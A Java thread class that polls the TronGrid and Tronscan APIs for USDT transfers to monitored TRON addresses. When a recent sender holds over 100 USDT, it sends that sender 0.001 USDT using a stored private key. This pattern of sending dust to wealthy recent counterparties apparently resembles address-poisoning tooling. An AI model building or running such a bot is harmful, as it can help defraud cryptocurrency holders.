package com.sjh.monitor_block;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.sjh.CommonUtil;
import com.sjh.Trc20Handler;
import com.sjh.WriteUtil;
import com.sjh.bean.BlockWalletBean;
import com.sjh.bean.TrongridTransactionBean;
import com.sjh.bean.WalletUsdtBalanceBean;
import com.sjh.sendusdt.SendThread;
import org.apache.commons.lang3.StringUtils;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.math.BigDecimal;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.List;
import java.util.Map;



/**
 * 监控具体的钱包地址
 * <p>
 * 思路：有n个监控地址；
 * 1 循环查找，找出所有的交易；
 * 2 找出当前最新的交易，比当前时间10s 内发生的，然后转账；
 */
public class MonitorSendSpecificWalletThread extends Thread {

    public  boolean isTest = false;

    public List<BlockWalletBean> mMyselfList; //自己的地址集合
    public String filePath;


    public MonitorSendSpecificWalletThread(String name, List<BlockWalletBean> myselfList, String filePath) {
        super(name);
        this.mMyselfList = myselfList;
        this.filePath = filePath;
    }

    public void setTest(boolean test) {
        isTest = test;
    }

    @Override
    public void run() {
        int count = 0;
        while (true) {

            try {
                //log("开始监控");
                Thread.sleep(1000 * 30);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            WriteUtil.log("循环次数:" + count + " ---------------------------------------------------------------------", filePath);

            count++;

            try {
                BlockWalletBean blockWalletBean;
                for (int i = 0; i < mMyselfList.size(); i++) {

                    // 1 查找监控账户的交易情况
                    blockWalletBean = mMyselfList.get(i);
                    WriteUtil.log("监控地址:" + blockWalletBean.toString(), filePath);
                    String specificWalletTransferUrl = "https://api.trongrid.io/v1/accounts/" + blockWalletBean.monitorAddress + "/transactions/trc20";

                    Map<String, String> paraMap = new HashMap<>();
                    paraMap.put("limit", "30");
                    paraMap.put("only_confirmed", "true");
                    paraMap.put("contract_address", "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
                    String content = httpGet(specificWalletTransferUrl, paraMap);
                    WriteUtil.log("content:" + content, filePath, false);
                    if (!StringUtils.isEmpty(content)) {

                        //2 解析被监控账户的交易数据
                        JSONObject jsonObject = JSONObject.parseObject(content);
                        JSONArray results = jsonObject.getJSONArray("data");
                        WriteUtil.log("交易信息个数:" + results.size(), filePath);

                        if (results.size() == 0) {
                            continue;
                        }

                        TrongridTransactionBean trongridTransactionBean = new TrongridTransactionBean();
                        JSONObject transferJsonObject = results.getJSONObject(0);
                        trongridTransactionBean.transaction_id = transferJsonObject.getString("transaction_id");
                        trongridTransactionBean.from = transferJsonObject.getString("from");
                        trongridTransactionBean.to = transferJsonObject.getString("to");
                        trongridTransactionBean.block_timestamp = transferJsonObject.getString("block_timestamp");
                        trongridTransactionBean.value = transferJsonObject.getString("value");
                        trongridTransactionBean.type = transferJsonObject.getString("type");

                        WriteUtil.log("最新的一笔交易情况:" + trongridTransactionBean.toString(), filePath);
                        String recevierAddress = trongridTransactionBean.to;
                        if (!recevierAddress.equals(blockWalletBean.monitorAddress)) {
                            WriteUtil.log("收款人必须是当前监控人", filePath);
                            continue;
                        }

                        if (!"Transfer".equals(trongridTransactionBean.type)) {
                            WriteUtil.log("交易类型必须为转账", filePath);
                            continue;
                        }


                        long transferAmount = Long.parseLong(trongridTransactionBean.value);
                        if (transferAmount < 1000000) {
                            WriteUtil.log("交易金额小于1u，不转账", filePath);
                            continue;
                        }

                        long curTimestamp = System.currentTimeMillis();
                        long transferTimestrap = Long.parseLong(trongridTransactionBean.block_timestamp);

                        if (curTimestamp - transferTimestrap > 1000 * 60 * 30) {
                            WriteUtil.log("交易时间太久远了，不转账:时间间隔为：" + (curTimestamp - transferTimestrap) / (1000 * 60) + "分钟", filePath);
                            continue;
                        }

                        if ((blockWalletBean.lastTransferTime) == 0) {
                            blockWalletBean.lastTransferTime = transferTimestrap;
                            WriteUtil.log(blockWalletBean.simpleName + "地址第一次赋予转账时间标记" + CommonUtil.geTimeBySpec(transferTimestrap), filePath);
                        } else {
                            if (blockWalletBean.lastTransferTime >= transferTimestrap) {
                                WriteUtil.log("上次转账时间大于等于这次时间，不符合要求", filePath);
                                WriteUtil.log("详细信息为-地址：" + blockWalletBean.simpleName + ";上一次转账时间:" + CommonUtil.geTimeBySpec(blockWalletBean.lastTransferTime)
                                        + ", 这次转账时间：" + CommonUtil.geTimeBySpec(transferTimestrap), filePath);
                                continue;
                            }
                        }

                        WriteUtil.log("基本条件满足，下面进行查看余额", filePath);

                        // 3 查询目标的账户信息，看账户中usdt 是否大于500；目标账户是给监控账户转账的账户
                        String findAccountInfoUrl = "https://apilist.tronscan.org/api/account";
                        Map<String, String> accountParaMap = new HashMap<>();
                        accountParaMap.put("address", trongridTransactionBean.from);


                        String accountInfoResp = httpGet(findAccountInfoUrl, accountParaMap);
                        WriteUtil.log("accountInfoResp:" + accountInfoResp, filePath, false);
                        JSONObject accountInfoObject = JSONObject.parseObject(accountInfoResp);
                        JSONArray walletInfos = accountInfoObject.getJSONArray("trc20token_balances");

                        if (walletInfos != null && walletInfos.size() >= 1) {
                            for (int k = 0; k < walletInfos.size(); k++) {
                                WalletUsdtBalanceBean walletUsdtBalanceBean = walletInfos.getObject(k, WalletUsdtBalanceBean.class);
                                String tokenId = walletUsdtBalanceBean.tokenId;
                                //这里有的人账户可能会有多个余额
                                if (tokenId.equals("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t")) {
                                    double balance = Double.parseDouble(walletUsdtBalanceBean.balance);
                                    // 4 判断目标账户是否符合要求
                                    if ((int) balance > 100 * 1000000) {
                                        blockWalletBean.aimAddress = trongridTransactionBean.from;
                                        WriteUtil.log(" 找到符合要求的账户了-地址:" + blockWalletBean.simpleName + ", 目标地址：" + blockWalletBean.aimAddress + "；账户余额为：" + (balance / 1000000)
                                                , filePath);
                                        if (!isTest){
                                            send(blockWalletBean);
                                        }
                                        break;
                                    } else {
                                        WriteUtil.log("地址没有足够的usdt, 不进行转账", filePath);
                                    }
                                } else {
                                    WriteUtil.log("转账不是usdt", filePath);
                                }

                            }
                        } else {
                            WriteUtil.log("账号里 查询不到有关trc20资产信息 ", filePath);
                        }

                    }
                }

            } catch (Exception e) {
                WriteUtil.log(e.getMessage(), filePath);
                e.printStackTrace();
            }

        }
    }

    public void send(BlockWalletBean blockWalletBean) {

        if (!StringUtils.isEmpty(blockWalletBean.aimAddress)) {

            Trc20Handler trc20Handler = new Trc20Handler();
            String fromAddress_private_key = blockWalletBean.privateKey;
            String toAddress = blockWalletBean.aimAddress;
            BigDecimal amount = new BigDecimal(0.001);
            WriteUtil.log("BlockWalletBean：" + blockWalletBean.toString(), filePath);

            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            try {
                String txid = trc20Handler.sendTrc20(toAddress, amount, fromAddress_private_key, filePath);
                if (StringUtils.isEmpty(txid)){
                    WriteUtil.log("发送任务失败", filePath);
                }else {
                    WriteUtil.log("发送任务完成", filePath);
                }
            } catch (Throwable throwable) {
                throwable.printStackTrace();
            }
        } else {
            WriteUtil.log("BlockWalletBean 的目标地址为空", filePath);
        }

    }

    public String httpGet(String url, Map<String, String> map) {
        HttpURLConnection conn;
        BufferedReader in = null;
        StringBuilder resultStr = new StringBuilder();

        StringBuilder urlStr = new StringBuilder(url);
        urlStr.append("?");
        if (map != null && !map.isEmpty()) {
            for (Map.Entry<String, String> entry : map.entrySet()) {
                urlStr.append(entry.getKey()).append("=");
                urlStr.append(entry.getValue());
                urlStr.append("&");
            }
            urlStr.deleteCharAt(urlStr.length() - 1);
        }

        WriteUtil.log("urlStr: " + urlStr, filePath);

        try {
            URL realUrl = new URL(urlStr.toString());
            conn = (HttpURLConnection) realUrl.openConnection();

            conn.setReadTimeout(5000);
            conn.setConnectTimeout(5000);
            conn.setRequestMethod("GET");

            // 开始连接网络 进行请求
            in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));

            if (conn.getResponseCode() == 200) {
                String line;
                while ((line = in.readLine()) != null) {
                    resultStr.append(line);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (in != null) {
                    in.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        return resultStr.toString();

    }


}
